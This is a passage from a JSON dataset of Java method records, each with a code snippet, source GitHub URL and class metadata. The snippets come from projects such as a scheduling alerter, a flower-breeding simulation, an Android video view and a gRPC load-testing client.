"setResultMsg", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setResultMsg(String resultMsg) {      this.resultMsg = resultMsg;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "Result", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getSystemTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSystemTime() {      return systemTime;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "Result", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setSystemTime", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSystemTime(String systemTime) {      this.systemTime = systemTime;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "Result", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "toHQL", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toHQL() {    String ifNot = ifNotExists ? \"IF NOT EXISTS \" : \"\";    return \"ALTER TABLE \" + table + \" ADD \" + ifNot + \"PARTITION (\" + partition        + \" = '\" + value + \"') LOCATION '\" + location + \"';\";  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/hiveutils/azkaban/hive/actions/AddExternalPartitionHQL.java", "stars": "18", "class": {"name": "AddExternalPartitionHQL", "extends": null, "implements": ["HQL"], "modifiers": []}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        List<String> list = List.of(\"a\", \"b\", \"a\", \"c\", \"d\");        System.out.println(list);//[a, b, a, c, d]        //list.add(\"w\");//UnsupportedOperationException:\u4e0d\u652f\u6301\u64cd\u4f5c\u5f02\u5e38        //Set<String> set = Set.of(\"a\", \"b\", \"a\", \"c\", \"d\");//IllegalArgumentException:\u975e\u6cd5\u53c2\u6570\u5f02\u5e38,\u6709\u91cd\u590d\u7684\u5143\u7d20        Set<String> set = Set.of(\"a\", \"b\", \"c\", \"d\");        System.out.println(set);        //set.add(\"w\");//UnsupportedOperationException:\u4e0d\u652f\u6301\u64cd\u4f5c\u5f02\u5e38        //Map<String, Integer> map = Map.of(\"\u5f20\u4e09\", 18, \"\u674e\u56db\", 19, \"\u738b\u4e94\", 20,\"\u5f20\u4e09\",19);////IllegalArgumentException:\u975e\u6cd5\u53c2\u6570\u5f02\u5e38,\u6709\u91cd\u590d\u7684\u5143\u7d20        Map<String, Integer> map = Map.of(\"\u5f20\u4e09\", 18, \"\u674e\u56db\", 19, \"\u738b\u4e94\", 20);        System.out.println(map);//{\u738b\u4e94=20, \u674e\u56db=19, \u5f20\u4e09=18}        //map.put(\"\u8d75\u56db\",30);//UnsupportedOperationException:\u4e0d\u652f\u6301\u64cd\u4f5c\u5f02\u5e38    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/15.%E3%80%90Map%E3%80%91-%E7%AC%94%E8%AE%B0/code/04_Map/src/com/itheima/demo04/JDK9/Demo01JDK9.java", "stars": "2", "class": {"name": "Demo01JDK9", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "editMutationRate", "params": ["float"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void editMutationRate(float mr) {        MUTATION_THRESH = mr;    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Breeder.java", "stars": "2", "class": {"name": "Breeder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "enoughFlowers", "params": ["ArrayList<Flower>"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "    private static boolean enoughFlowers(ArrayList<Flower> flowers) {        return flowers.size() > 1;    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Breeder.java", "stars": "2", "class": {"name": "Breeder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCouples", "params": ["ArrayList<Flower>"], "throws": null, "modifiers": ["private", "static"], "return_type": "ArrayList<Flower>", "snippet": "    private static ArrayList<Flower[]> getCouples(ArrayList<Flower> flowers) {        ArrayList<Flower[]> couples = new ArrayList<>();        //check every flower        for (int i = 0; i < flowers.size(); i++) {            Flower center = flowers.get(i);            //check every other flower            for (int o = i; o < flowers.size(); o++) {                Flower neigh = flowers.get(o);                //if the distance is less than the minimum breeding-radius, it's a couple                if (center.getPos().distance(neigh.getPos()) < Math.min(center.getDNA().getBreedRad(), neigh.getDNA().getBreedRad())) {                    couples.add(new Flower[]{center, neigh});                }            }        }        return couples;    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Breeder.java", "stars": "2", "class": {"name": "Breeder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "shouldGenerate", "params": ["Flower"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "    private static boolean shouldGenerate(Flower[] couple) {        return Math.random() < Math.min(couple[0].getDNA().getBreedProb(), couple[1].getDNA().getBreedProb());    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Breeder.java", "stars": "2", "class": {"name": "Breeder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMeltedTraits", "params": ["Genes", "Genes"], "throws": null, "modifiers": ["private", "static"], "return_type": "ArrayList<Trait>", "snippet": "    private static ArrayList<Trait> getMeltedTraits(Genes g1, Genes g2) {        ArrayList<Trait> traits = new ArrayList<>();        //add the first genes        g1.getTraits().forEach((t1) -> {            traits.add(t1);        });        //add the second genes        g2.getTraits().forEach((t2) -> {            traits.add(t2);        });        //shuffle the genes        Collections.shuffle(traits, new Random());        //randomize the genes        for (int i = 0; i < traits.size(); i++) {            if (Math.random() < MUTATION_THRESH) {                traits.get(i).randomize();            }        }        return traits;    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Breeder.java", "stars": "2", "class": {"name": "Breeder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPos", "params": ["Flower"], "throws": null, "modifiers": ["private", "static"], "return_type": "Point2D", "snippet": "    private static Point2D getPos(Flower[] couple) {        int radius = Math.min(couple[0].getDNA().getBreedRad(), couple[1].getDNA().getBreedRad());        Point2D p1 = couple[0].getPos();        Point2D p2 = couple[1].getPos();        //returns the average of the parents' position, plus a random value         //the position will still be inside the breeding radius        return new Point2D(                (p1.x + p2.x) / 2 + (float) Math.random() * 2 * radius - radius,                (p1.y + p2.y) / 2 + (float) Math.random() * 2 * radius - radius        );    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Breeder.java", "stars": "2", "class": {"name": "Breeder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "generate", "params": ["Flower"], "throws": null, "modifiers": ["private", "static"], "return_type": "Flower", "snippet": "    private static Flower generate(Flower[] couple) {        //Fill every DNA trait singularly        ArrayList<Color> colors = new ArrayList<>();        ArrayList<Integer> lifespan = new ArrayList<>();        ArrayList<Integer> radius = new ArrayList<>();        ArrayList<Float> probability = new ArrayList<>();        couple[0].getGenes().getTraits().forEach((trait) -> {            colors.add(trait.getColor());            lifespan.add(trait.getLifespan());            radius.add(trait.getBreedRad());            probability.add(trait.getBreedProb());        });        couple[1].getGenes().getTraits().forEach((trait) -> {            colors.add(trait.getColor());            lifespan.add(trait.getLifespan());            radius.add(trait.getBreedRad());            probability.add(trait.getBreedProb());        });        //Extract one of all to get the traits        Color col = colors.get((int) (Math.random() * colors.size()));        int ls = lifespan.get((int) (Math.random() * lifespan.size()));        int rad = radius.get((int) (Math.random() * radius.size()));        float prob = probability.get((int) (Math.random() * probability.size()));        //Create traits        Trait dna = new Trait(col, ls, rad, prob);        //Create genes        Genes genes = new Genes(getMeltedTraits(couple[0].getGenes(), couple[1].getGenes()));        return new Flower(dna, genes, getPos(couple));    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Breeder.java", "stars": "2", "class": {"name": "Breeder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "breed", "params": ["Field"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean breed(Field f) {        ArrayList<Flower> flowers = f.getFlowers();        //decrease lifespan of every flower        for (int i = 0; i < flowers.size(); i++) {            Flower fl = flowers.get(i);            fl.passDay();            //if a flower dies, i don't need it anymore            if (fl.isDead()) {                flowers.remove(fl);            }        }        //check if there is more than one flower        if (!enoughFlowers(flowers)) {            System.out.println(\"Not enough flowers\");            return false;        }        //check if there are neighbor-flowers        ArrayList<Flower[]> couples = getCouples(flowers);        if (couples.isEmpty()) {            System.out.println(\"Not enough couples\");            return false;        }        //check if there's chance to breed        couples.stream().filter((couple) -> (shouldGenerate(couple))).map((couple) -> generate(couple)).forEachOrdered((son) -> {            f.plant(son);        });        return true;    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Breeder.java", "stars": "2", "class": {"name": "Breeder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {        measureHelper = new MeasureHelper(this, this);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onMeasure", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {        measureHelper.prepareMeasure(widthMeasureSpec, heightMeasureSpec, (int) getRotation());        setMeasuredDimension(measureHelper.getMeasuredWidth(), measureHelper.getMeasuredHeight());    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "surfaceCreated", "params": ["SurfaceHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void surfaceCreated(SurfaceHolder holder) {        if (mIGSYSurfaceListener != null) {            mIGSYSurfaceListener.onSurfaceAvailable(holder.getSurface());        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "surfaceChanged", "params": ["SurfaceHolder", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {        if (mIGSYSurfaceListener != null) {            mIGSYSurfaceListener.onSurfaceSizeChanged(holder.getSurface(), width, height);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "surfaceDestroyed", "params": ["SurfaceHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void surfaceDestroyed(SurfaceHolder holder) {        //\u6e05\u7a7a\u91ca\u653e        if (mIGSYSurfaceListener != null) {            mIGSYSurfaceListener.onSurfaceDestroyed(holder.getSurface());        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "surfaceRedrawNeeded", "params": ["SurfaceHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void surfaceRedrawNeeded(SurfaceHolder holder) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getIGSYSurfaceListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IGSYSurfaceListener", "snippet": "    public IGSYSurfaceListener getIGSYSurfaceListener() {        return mIGSYSurfaceListener;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setIGSYSurfaceListener", "params": ["IGSYSurfaceListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIGSYSurfaceListener(IGSYSurfaceListener surfaceListener) {        getHolder().addCallback(this);        this.mIGSYSurfaceListener = surfaceListener;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getSizeH", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSizeH() {        return measureHelper.getMeasuredHeight();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getSizeW", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSizeW() {        return measureHelper.getMeasuredWidth();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "taskShotPic", "params": ["GSYVideoShotListener", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void taskShotPic(GSYVideoShotListener gsyVideoShotListener, boolean shotHigh) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "saveFrame", "params": ["File", "boolean", "GSYVideoShotSaveListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void saveFrame(File file, boolean high, GSYVideoShotSaveListener gsyVideoShotSaveListener) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getRenderView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getRenderView() {        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "initCover", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Bitmap", "snippet": "    public Bitmap initCover() {        return null;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "initCoverHigh", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Bitmap", "snippet": "    public Bitmap initCoverHigh() {        return null;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onRenderResume", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRenderResume() {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onRenderPause", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRenderPause() {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "releaseRenderAll", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseRenderAll() {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setRenderMode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRenderMode(int mode) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setRenderTransform", "params": ["Matrix"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRenderTransform(Matrix transform) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setGLRenderer", "params": ["GSYVideoGLViewBaseRender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGLRenderer(GSYVideoGLViewBaseRender renderer) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setGLMVPMatrix", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGLMVPMatrix(float[] MVPMatrix) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setGLEffectFilter", "params": ["GSYVideoGLView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGLEffectFilter(GSYVideoGLView.ShaderInterface effectFilter) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setVideoParamsListener", "params": ["MeasureHelper"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVideoParamsListener(MeasureHelper.MeasureFormVideoParamsListener listener) {        mVideoParamsListener = listener;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getCurrentVideoWidth", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCurrentVideoWidth() {        if (mVideoParamsListener != null) {            return mVideoParamsListener.getCurrentVideoWidth();        }        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getCurrentVideoHeight", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCurrentVideoHeight() {        if (mVideoParamsListener != null) {            return mVideoParamsListener.getCurrentVideoHeight();        }        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getVideoSarNum", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarNum() {        if (mVideoParamsListener != null) {            return mVideoParamsListener.getVideoSarNum();        }        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getVideoSarDen", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarDen() {        if (mVideoParamsListener != null) {            return mVideoParamsListener.getVideoSarDen();        }        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "addSurfaceView", "params": ["Context", "ViewGroup", "int", "IGSYSurfaceListener", "MeasureHelper"], "throws": null, "modifiers": ["public", "static"], "return_type": "CustomTextureSurface", "snippet": "    public static CustomTextureSurface addSurfaceView(Context context, ViewGroup textureViewContainer, int rotate,                                                      final IGSYSurfaceListener gsySurfaceListener,                                                      final MeasureHelper.MeasureFormVideoParamsListener videoParamsListener) {        if (textureViewContainer.getChildCount() > 0) {            textureViewContainer.removeAllViews();        }        CustomTextureSurface showSurfaceView = new CustomTextureSurface(context);        showSurfaceView.setIGSYSurfaceListener(gsySurfaceListener);        showSurfaceView.setRotation(rotate);        showSurfaceView.setVideoParamsListener(videoParamsListener);        GSYRenderView.addToParent(textureViewContainer, showSurfaceView);        return showSurfaceView;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomTextureSurface.java", "stars": "2", "class": {"name": "CustomTextureSurface", "extends": "SurfaceView", "implements": ["IGSYRenderView", "SurfaceHolder", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "move", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void move() {\t\tSystem.out.println(\"\u9e1f\u513f\u5728\u98de\u7fd4\uff01\"); \t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/duotai/Bird.java", "stars": "2", "class": {"name": "Bird", "extends": "Animal", "implements": null, "modifiers": ["public"]}}, {"method_name": "fly", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void fly() {\t\tSystem.out.println(\"Bird fly!\");\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/duotai/Bird.java", "stars": "2", "class": {"name": "Bird", "extends": "Animal", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": ["String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init(String HOST_PORT, String TEST_PROTO_FILES, String FULL_METHOD) {        hostAndPort = HostAndPort.fromString(HOST_PORT);        ProtoMethodName grpcMethodName =                ProtoMethodName.parseFullGrpcMethodName(FULL_METHOD);        ChannelFactory channelFactory = ChannelFactory.create();        Channel channel;        channel = channelFactory.createChannel(hostAndPort);        // Fetch the appropriate file descriptors for the service.        final DescriptorProtos.FileDescriptorSet fileDescriptorSet;        try {            fileDescriptorSet = ProtocInvoker.forConfig(TEST_PROTO_FILES).invoke();        } catch (Throwable t) {            throw new RuntimeException(\"Unable to resolve service by invoking protoc\", t);        }        // Set up the dynamic client and make the call.        ServiceResolver serviceResolver = ServiceResolver.fromFileDescriptorSet(fileDescriptorSet);        methodDescriptor = serviceResolver.resolveServiceMethod(grpcMethodName);        dynamicClient = DynamicGrpcClient.create(methodDescriptor, channel);        // This collects all known types into a registry for resolution of potential \"Any\" types.        registry = JsonFormat.TypeRegistry.newBuilder()                .add(serviceResolver.listMessageTypes())                .build();    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/ClientCaller.java", "stars": "3", "class": {"name": "ClientCaller", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "buildRequest", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String buildRequest(String pathReq, String jsonData) {        Path REQUEST_FILE = Paths.get(pathReq);        requestMessages =                MessageReader.forFile(REQUEST_FILE, methodDescriptor.getInputType(), registry, jsonData).read();        return requestMessages.get(0).toString();    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/ClientCaller.java", "stars": "3", "class": {"name": "ClientCaller", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "call", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "DynamicMessage", "snippet": "    public DynamicMessage call(long deadlineMs) {        DynamicMessage resp;        try {            resp = dynamicClient.blockingUnaryCall(requestMessages, callOptions(deadlineMs));        } catch (Throwable t) {            throw new RuntimeException(\"Caught exception while waiting for rpc\", t);        }        return resp;    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/ClientCaller.java", "stars": "3", "class": {"name": "ClientCaller", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "callOptions", "params": ["long"], "throws": null, "modifiers": ["private", "static"], "return_type": "CallOptions", "snippet": "    private static CallOptions callOptions(long deadlineMs) {        CallOptions result = CallOptions.DEFAULT;        if (deadlineMs > 0) {            result = result.withDeadlineAfter(deadlineMs, TimeUnit.MILLISECONDS);        }        return result;    }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/ClientCaller.java", "stars": "3", "class": {"name": "ClientCaller", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {        super.init();    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/impl/ModeComponent.java", "stars": "12", "class": {"name": "ModeComponent", "extends": "Component", "implements": null, "modifiers": ["public"]}}, {"method_name": "moved", "params": ["float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void moved(float x, float y) {        super.moved(x, y);    }", "url": 